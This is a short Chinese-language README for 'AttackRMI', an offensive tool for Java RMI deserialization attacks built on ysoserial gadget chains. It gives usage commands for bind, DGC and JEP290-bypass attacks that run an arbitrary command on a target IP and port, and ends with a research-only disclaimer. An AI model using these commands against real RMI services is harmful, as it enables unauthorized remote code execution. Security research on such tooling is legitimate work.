# AttackRMI

## 介绍

该项目参考 ysoserial 项目中 RMI 相关代码，对 RMI 利用实现回显，目前支持的链有`CommonsCollections2`、`CommonsCollections11`、`Jdk7u21`，其中 Jdk7u21 在 bind 和 DGC 两种利用方式中不支持回显

bind 攻击：

```bash
java -jar AttackRMI.jar [payloadType] [ip] [port] "[command]"
```

DGC 攻击：

```bash
java -cp AttackRMI.jar exploit.JRMPClient [payloadType] [ip] [port] "[command]"
```

Bypass JEP290 利用方式：

```bash
java -cp AttackRMI.jar exploit.JRMPListener [payloadType] [localIp] [localPort] "[command]"
```

## 免责声明

本项目仅面向安全研究与学习，禁止任何非法用途

如您在使用本项目的过程中存在任何非法行为，您需自行承担相应后果

除非您已充分阅读、完全理解并接受本协议，否则，请您不要使用本项目